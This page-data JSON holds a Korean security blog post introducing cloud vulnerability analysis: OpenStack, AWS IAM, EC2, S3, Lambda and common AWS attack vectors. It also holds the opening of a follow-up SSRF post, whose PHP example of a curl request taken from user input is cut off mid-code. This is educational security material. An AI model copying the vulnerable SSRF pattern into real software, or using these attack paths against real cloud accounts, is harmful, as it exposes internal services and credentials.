{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/cloud-service-vuln-0/",
    "result": {"data":{"cur":{"id":"3598a0dc-de2b-598a-bc02-4b43a646bcfa","html":"<h1 id=\"클라우드-서비스-취약점-분석-0\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-0\" aria-label=\"클라우드 서비스 취약점 분석 0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 0</h1>\n<h1 id=\"클라우드-컴퓨팅-보안\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%BB%B4%ED%93%A8%ED%8C%85-%EB%B3%B4%EC%95%88\" aria-label=\"클라우드 컴퓨팅 보안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 컴퓨팅 보안</h1>\n<ul>\n<li>기업, 조직 내의 데이터, 애플리케이션, 워크로드를 클라우드 컴퓨팅에 저장하고 다양한 서비스로 활용하며 서로가 공유하면서 지속적으로 변화가 발생합니다. 이와 동시에 새로운 보안 위협과 과제도 생겨나며 많은 양의 데이터가 퍼블릭 클라우드 서비스에 저장되면서 해커들의 공격 목표가 됐습니다.</li>\n</ul>\n<h1 id=\"public-cloud---private-cloud\" style=\"position:relative;\"><a href=\"#public-cloud---private-cloud\" aria-label=\"public cloud   private cloud permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Public Cloud &#x26;  Private Cloud</h1>\n<h3 id=\"public-cloud\" style=\"position:relative;\"><a href=\"#public-cloud\" aria-label=\"public cloud permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Public Cloud</h3>\n<ul>\n<li>Azure, AWS, GCP, Alibaba, NCP 등 다양한 클라우드 서비스</li>\n<li>LasS, PasS, SaaS 등 다양한 스펙트럼의 서비스 제공</li>\n</ul>\n<h3 id=\"private-cloud\" style=\"position:relative;\"><a href=\"#private-cloud\" aria-label=\"private cloud permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Private Cloud</h3>\n<ul>\n<li>조직 내 클라우드, 개인정보 관리 등 직접 구축할 이유가 있을 때 사용</li>\n<li>Public Cloud 사업자 시작 이전 단계가 필요한 경우 사용</li>\n<li>OpenStack을 주로 많이 이용</li>\n</ul>\n<h3 id=\"openstack\" style=\"position:relative;\"><a href=\"#openstack\" aria-label=\"openstack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>OpenStack</h3>\n<ul>\n<li>Rackspace, NASA가 공동개발로 2010년에 Release한 오픈 소스 클라우드 컴퓨팅 플랫폼입니다.</li>\n<li>이미징, 네트워킹, 컴퓨팅, 볼륨 관리 및 인증 관리 등 클라우드 서비스를 제공하기 위해 각각의 자원관리 지능을 프로젝트 단위로 관리합니다.</li>\n<li>실제로는 EC2, VCP, … 각 역활에 대해서 호환되는 정도가 많습니다.</li>\n<li>클라우드 시스템을 구축할 때는 가상화가 필수 이며 이미지, 볼륨을 관리할 시스템이 필요합니다.</li>\n</ul>\n<p><img src=\"/ad9c44d89f3247960fbf97c3c28f8866/overview-diagram-new.svg\" alt=\"https://www.openstack.org/\"></p>\n<p><a href=\"https://www.openstack.org/\">https://www.openstack.org/</a></p>\n<h3 id=\"nova-compute-service\" style=\"position:relative;\"><a href=\"#nova-compute-service\" aria-label=\"nova compute service permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Nova Compute Service</h3>\n<ul>\n<li>OpenStack 에서 가장 중요한 서비스에 해당되며, Hyper-V를 호출해서 각 인스터를 생성하고 관리하는 역활을 수행합니다.</li>\n<li>대시보드 등에서 RESETful API 형태인 nova-api를 통해서 인스턴스 생성 등의 명령을 전달합니다.</li>\n<li>Nova-Computer 를 거쳐서 Hyper-V에 명령을 전달하고,최종적으로 명령을 수행합니다.</li>\n<li>생성된 인스턴스는 nova-console을 통해 통신이 가능합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 141.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"https://docs.openstack.org/nova/pike/user/architecture.html\"\n        title=\"https://docs.openstack.org/nova/pike/user/architecture.html\"\n        src=\"/static/c465a15b2718d776f9adf0c859731e9e/37523/nova-arch.png\"\n        srcset=\"/static/c465a15b2718d776f9adf0c859731e9e/e9ff0/nova-arch.png 180w,\n/static/c465a15b2718d776f9adf0c859731e9e/f21e7/nova-arch.png 360w,\n/static/c465a15b2718d776f9adf0c859731e9e/37523/nova-arch.png 720w,\n/static/c465a15b2718d776f9adf0c859731e9e/302a4/nova-arch.png 1080w,\n/static/c465a15b2718d776f9adf0c859731e9e/07a9c/nova-arch.png 1440w,\n/static/c465a15b2718d776f9adf0c859731e9e/dca52/nova-arch.png 1550w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>)</p>\n<p><a href=\"https://docs.openstack.org/nova/pike/user/architecture.html\">https://docs.openstack.org/nova/pike/user/architecture.html</a></p>\n<h1 id=\"aws-iam\" style=\"position:relative;\"><a href=\"#aws-iam\" aria-label=\"aws iam permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>AWS IAM</h1>\n<ul>\n<li>AWS 리소스에 대한 권한 및 접근 제어를 리소스별로 세분화하여 제어할 수 있는 서비스 입니다.</li>\n<li>Group, User, Role, Policy로 설정이 가능합니다.</li>\n<li>권한 상승, 유출 문제 등 취약저 분석 과정에서 가장 눈여겨봐야 하는 부분중 하나입니다.</li>\n<li>주로 구축했던 시기에 취약점이 발생되어 노출이 되는 경우 입니다.</li>\n</ul>\n<h3 id=\"pbac-설명\" style=\"position:relative;\"><a href=\"#pbac-%EC%84%A4%EB%AA%85\" aria-label=\"pbac 설명 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PBAC 설명</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">[사용자]\n피터 - 기사     &lt;그룹: 공격대1>\n케빈 - 마법사   &lt;그룹: 공격대1>\n레이 - 힐러     &lt;그룹: 공격대1>\n\n[그룹]\n공격대1         &lt;역활: ['몬스터 잡기']>\n\n[역활]\n몬스터 잡기     &lt;정책:  [일반 공격]>\n\n[정책]\nAllow 일반 공격 if 사용자.마법사? == True (MP Object 사용)\nAllow 일반 공격 if 사용자.전사? == True (HP Object 사용)\nAllow 일반 공격 if 사용자.힐러? == True (GP Object 사용)</code></pre></div>\n<ul>\n<li>관리의 용이성을 위해 동일한 그룹내에 사용자를 편성 합니다.</li>\n<li>편성된 그룹에 한하여 수행할 수있는 역활을 부여합니다.</li>\n<li>역활 수행시 그룹 내 정해진 사용자에 한하여 수행하도록 정책을 설정합니다.</li>\n<li>역활 수행시 정해진 객체에 한해서 접근하여 수행하도록 정책을 설정합니다.</li>\n</ul>\n<h3 id=\"iam-정책\" style=\"position:relative;\"><a href=\"#iam-%EC%A0%95%EC%B1%85\" aria-label=\"iam 정책 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM 정책</h3>\n<ul>\n<li>JSON 포맷을 사용하며 각 데이터를 세분화해서 관리를 진행합니다.</li>\n</ul>\n<p><a href=\"https://docs.aws.amazon.com/ko_kr/IAM/latest/UserGuide/reference_policies_grammar.html\">IAM JSON 정책 언어의 문법</a></p>\n<h1 id=\"ec2\" style=\"position:relative;\"><a href=\"#ec2\" aria-label=\"ec2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2</h1>\n<ul>\n<li>virtualization Compute Instance, 가장 일반적으로 생성해서 사용하는 서비스입니다.</li>\n<li>AMI (Image), EBS(Volume)을 이용해서 인스턴스 백업이 가능합니다.</li>\n<li>외부에서 Exploit 진행시 비중이 가장 높은 인스턴스 입니다.</li>\n</ul>\n<h1 id=\"s3\" style=\"position:relative;\"><a href=\"#s3\" aria-label=\"s3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>S3</h1>\n<ul>\n<li>업로드, 다운로드 등의 행위로만 구성된 Storage Instance 입니다.</li>\n<li>정적 웹 서비스 요소로 구축이 가능합니다.</li>\n<li>보안사고에서 자주 언급된는 S3 data breach가 이 곳의 데이터 유출을 말합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">https://s3.console.aws.amazon.com/s3/home?region=ap-northeast-2</code></pre></div>\n<h1 id=\"lambda\" style=\"position:relative;\"><a href=\"#lambda\" aria-label=\"lambda permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lambda</h1>\n<ul>\n<li>이벤트 기반의 서버리스 서비스 인스턴스 (Python, nodeJS, Go, .NET, Ruby 지원) 입니다.</li>\n<li>내부적으로 Amazon Linux AMI에서 생성되는 컨테이너, +egress controller</li>\n<li>API Gateway, S3, SQ3, SNS 등과의 다양한 조합으로 사용가능한 서버리스 구조입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">https://console.aws.amazon.com/lambda/home?region=ap-northeast-2</code></pre></div>\n<h1 id=\"aws-공격-벡터\" style=\"position:relative;\"><a href=\"#aws-%EA%B3%B5%EA%B2%A9-%EB%B2%A1%ED%84%B0\" aria-label=\"aws 공격 벡터 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>AWS 공격 벡터</h1>\n<ul>\n<li>IAM 의 권한 문제로 인해 많은 보안 문제가 야기됩니다.</li>\n<li>IAM Leak  (환경 변수, Instance Post Exploitation, SSRF…)</li>\n<li>IAM Privilege Escalation</li>\n<li>S3 Data Breach</li>\n<li>개발 구축 환경에서 발생 가능한 취약점 (CI/CD, Code Deploy, Terraform, …)</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#public-cloud\">Public Cloud</a></li>\n<li><a href=\"#private-cloud\">Private Cloud</a></li>\n<li><a href=\"#openstack\">OpenStack</a></li>\n<li><a href=\"#nova-compute-service\">Nova Compute Service</a></li>\n<li><a href=\"#pbac-%EC%84%A4%EB%AA%85\">PBAC 설명</a></li>\n<li><a href=\"#iam-%EC%A0%95%EC%B1%85\">IAM 정책</a></li>\n</ul>\n</div>","excerpt":"클라우드 서비스 취약점 분석 0 클라우드 컴퓨팅 보안 기업, 조직 내의 데이터, 애플리케이션, 워크로드를 클라우드 컴퓨팅에 저장하고 다양한 서비스로 활용하며 서로가 공유하면서 지속적으로 변화가 발생합니다. 이와 동시에 새로운 보안 위협과 과제도 생겨나며 많은 양의 데이터가 퍼블릭 클라우드 서비스에 저장되면서 해커들의 공격 목표가 됐습니다. Public Cloud &  Private Cloud Public Cloud Azure, AWS, GCP, Alibaba, NCP 등 다양한 클라우드 서비스 LasS, PasS, SaaS 등 다양한 스펙트럼의 서비스 제공 Private Cloud 조직 내 클라우드, 개인정보 관리 등 직접 구축할 이유가 있을 때 사용 Public Cloud 사업자 시작 이전 단계가 필요한 경우 사용 OpenStack을 주로 많이 이용 OpenStack Rackspace, NASA가 공동개발로 2010년에 Release한 오픈 소스 클라우드 컴퓨팅 플랫폼입니다. 이…","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 0 (클라우드 서비스 취약점 개요)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-0/"}},"next":{"id":"ac0a8ece-b243-5099-8ec2-73ee818ee536","html":"<h1 id=\"ssrf-overview\" style=\"position:relative;\"><a href=\"#ssrf-overview\" aria-label=\"ssrf overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRF Overview</h1>\n<ul>\n<li>웹 어플리케이션에서 요청이 보내질 떄 웹 어플리케이션이 작동하고 있는 서버 내부의 포트, 서버와 연결된 내부망에 요청을 보낼 수 가 있죠</li>\n<li>server-side에서 변조된 요청, 의도하지 않은 서버로 요청을 보내어 별도의 인증 없이 내부방 안에서 요청되는 데이터를 조작하는 공격 기법입니다.</li>\n<li>즉, 공격자가 의도한 서버로 요청을 가게 하는 취약점으로 CSRF 와 유사한 형태지만 클라이언트가 아닌 서버에 직접 영향을 줄 수 있다는 점에서 차이가 있습니다.</li>\n</ul>\n<p><strong>다른 공격 기법과 연계</strong></p>\n<ul>\n<li>다른 취약점과 연계에서 사용할 경우 RCE로 이어질 수 있기 때문에 파급력이 큽니다.\n<ul>\n<li>XXE 취약점 + SSRF 취약점</li>\n<li>SSRF 취약점 + CRLF Injection 취약점</li>\n<li>SSRF 취약점 + Redis-Server 연계 취약점</li>\n<li>SSRF + MongoDB 연계 취약점</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"php-ssrf-example\" style=\"position:relative;\"><a href=\"#php-ssrf-example\" aria-label=\"php ssrf example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP SSRF Example</h2>\n<ul>\n<li>php curl API가 설정된 대상 애플리케이션 환경에서 GET 메서드의 url 쿼리를 통해 SSRF 공격이 수행되는 예시입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token variable\">$c_i</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token 